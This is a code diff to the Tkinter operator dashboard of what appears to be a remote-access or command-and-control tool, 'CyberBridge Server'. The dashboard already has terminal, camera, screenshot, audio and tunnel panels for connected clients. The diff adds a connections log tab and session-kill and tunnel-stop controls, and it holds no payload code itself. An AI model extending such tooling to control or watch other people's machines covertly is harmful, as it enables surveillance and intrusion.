@@ -91,6 +91,30 @@ class MatrixRain(tk.Canvas):
         self.after(self.SPEED, self._animate)
 
 
+class ConnectionsLogPanel(tk.Frame):
+    """Displays tunnel/proxy connection logs."""
+    def __init__(self, parent, **kwargs):
+        super().__init__(parent, bg=BG_DEEP, **kwargs)
+        self._text = tk.Text(self, bg=BG_DEEP, fg=FG_PRIMARY, font=FONT_MONO_SM,
+                             state="disabled", wrap="none")
+        self._text.pack(fill="both", expand=True, padx=4, pady=4)
+        # Add scrollbar
+        sb = tk.Scrollbar(self, command=self._text.yview)
+        sb.pack(side="right", fill="y")
+        self._text.config(yscrollcommand=sb.set)
+
+    def log(self, line: str):
+        self._text.config(state="normal")
+        self._text.insert("end", line + "\n")
+        self._text.see("end")
+        self._text.config(state="disabled")
+
+    def clear(self):
+        self._text.config(state="normal")
+        self._text.delete("1.0", "end")
+        self._text.config(state="disabled")
+
+
 # ─── Main Dashboard Window ────────────────────────────────────────────────────
 
 class Dashboard:
@@ -203,9 +227,10 @@ class Dashboard:
 
         # Left panel (connection list)
         self._conn_panel = ConnectionPanel(body,
-                                           on_select_session=self._on_select_session,
-                                           on_delete_session=self._remove_session,
-                                           width=320)
+                                            on_select_session=self._on_select_session,
+                                            on_delete_session=self._remove_session,
+                                            on_kill_session=self._kill_session,
+                                            width=320)
         self._conn_panel.pack(side="left", fill="y", padx=(4, 2), pady=4)
 
         # Right: notebook with tabs
@@ -244,8 +269,8 @@ class Dashboard:
         self._ss_panel    = ScreenshotPanel(self._nb)
         self._audio_panel = AudioPanel(self._nb)
 
-        # Matrix rain idle tab
-        self._matrix     = MatrixRain(self._nb)
+        # Connections log tab
+        self._conn_log     = ConnectionsLogPanel(self._nb)
 
         self._nb.add(self._term_panel,  text="  ▶ TERMINAL  ")
         self._nb.add(self._sys_panel,   text="  ◆ SYSINFO   ")
@@ -253,7 +278,7 @@ class Dashboard:
         self._nb.add(self._cam_panel,   text="  ◉ CAMERA    ")
         self._nb.add(self._ss_panel,    text="  ⎙ SCREENSHOT")
         self._nb.add(self._audio_panel, text="  🎙 AUDIO     ")
-        self._nb.add(self._matrix,      text="  ◈ MATRIX    ")
+        self._nb.add(self._conn_log,    text="  ◈ CONEXIONES")
 
         # Start matrix on last tab select
         self._nb.bind("<<NotebookTabChanged>>", self._on_tab_change)
@@ -284,7 +309,13 @@ class Dashboard:
                                      command=self._open_proxy_window,
                                      bg=BG_DEEP, fg=FG_CYAN, font=FONT_STATUS,
                                      relief="flat", cursor="hand2", bd=0)
-        self._tunnel_btn.pack(side="right", padx=16, pady=2)
+        self._tunnel_btn.pack(side="right", padx=8, pady=2)
+
+        self._tunnel_stop_btn = tk.Button(sb, text="✕ MATAR TÚNEL",
+                                          command=self._stop_tunnel,
+                                          bg=BG_DEEP, fg=FG_RED, font=FONT_STATUS,
+                                          relief="flat", cursor="hand2", bd=0)
+        self._tunnel_stop_btn.pack(side="right", padx=8, pady=2)
 
     # ─── Session management ───────────────────────────────────────────────────
 
@@ -353,6 +384,27 @@ class Dashboard:
             self._status_lbl.config(text="● AWAITING CONNECTIONS", fg=FG_DIM)
         self._on_sessions_update()
 
+    def _kill_session(self, session):
+        if not session:
+            return
+        try:
+            session.disconnect()
+        except Exception:
+            pass
+        # Optionally remove from manager
+        if self._mgr:
+            self._mgr.remove_session(session.client_id)
+        if self._session and self._session.client_id == session.client_id:
+            self._term_panel.clear_session()
+            self._sys_panel.clear_session()
+            self._cam_panel.clear_session()
+            self._ss_panel.clear_session()
+            self._audio_panel.clear_session()
+            self._session = None
+            self._session_lbl.config(text="[ No session selected — click a client ]", fg=FG_DIM)
+            self._status_lbl.config(text="● AWAITING CONNECTIONS", fg=FG_DIM)
+        self._on_sessions_update()
+
     # ─── Session manager (Protocol Factory) ───────────────────────────────────
 
     def _start_session_manager(self, protocol="HTTP"):
@@ -404,11 +456,8 @@ class Dashboard:
     # ─── Tab change ───────────────────────────────────────────────────────────
 
     def _on_tab_change(self, event):
-        tab = self._nb.index("current")
-        if tab == 5:   # Matrix tab
-            self._matrix.start()
-        else:
-            self._matrix.stop()
+        # No matrix animation needed anymore
+        pass
 
     # ─── Dialogs ──────────────────────────────────────────────────────────────
 
@@ -502,10 +551,23 @@ class Dashboard:
             selected = proxy_var.get()
             win.destroy()
             self._bottom_lbl.config(text=f"Iniciando túnel {selected}...", fg=FG_YELLOW)
+            # Clear previous logs and start logging
+            self._conn_log.clear()
+            def _on_log(line):
+                # Append log to connections panel on UI thread
+                self._root.after(0, lambda l=line: self._conn_log.log(l))
             # Assuming HTTP is on 18812 for now
-            self._proxy_mgr.start_proxy(selected, 18812, on_url_found=_on_url_found, on_error=_on_error)
-                
-        tk.Button(win, text="START TUNNEL", command=_apply, **STYLE_BUTTON).pack(pady=15)
+            self._proxy_mgr.start_proxy(selected, 18812, on_url_found=_on_url_found, on_error=_on_error, on_log=_on_log)
+
+        def _stop():
+            self._proxy_mgr.stop_proxy()
+            self._bottom_lbl.config(text=f"CyberBridge Server  |  {self._current_protocol.upper()}  |  Túnel detenido", fg=FG_DIM)
+            self._conn_log.log("--- Túnel detenido ---")
+
+        btn_frame = tk.Frame(win, bg=BG_PANEL)
+        btn_frame.pack(pady=15)
+        tk.Button(btn_frame, text="START TUNNEL", command=_apply, **STYLE_BUTTON).pack(side="left", padx=5)
+        tk.Button(btn_frame, text="STOP TUNNEL", command=_stop, **STYLE_BUTTON_DANGER).pack(side="left", padx=5)
 
 
     def _show_about(self):
@@ -523,6 +585,13 @@ class Dashboard:
 
     # ─── Lifecycle ────────────────────────────────────────────────────────────
 
+    def _stop_tunnel(self):
+        if self._proxy_mgr:
+            self._proxy_mgr.stop_proxy()
+            self._bottom_lbl.config(text=f"CyberBridge Server  |  {self._current_protocol.upper()}  |  Túnel detenido", fg=FG_DIM)
+            if hasattr(self, '_conn_log'):
+                self._conn_log.log("--- Túnel detenido por usuario ---")
+
     def _on_close(self):
         if self._mgr:
             self._mgr.stop()
@@ -531,6 +600,4 @@ class Dashboard:
         self._root.destroy()
 
     def run(self):
-        self._matrix.start()          # Start rain on the matrix tab
-        self._matrix.stop()           # But stop immediately (only on tab select)
         self._root.mainloop()
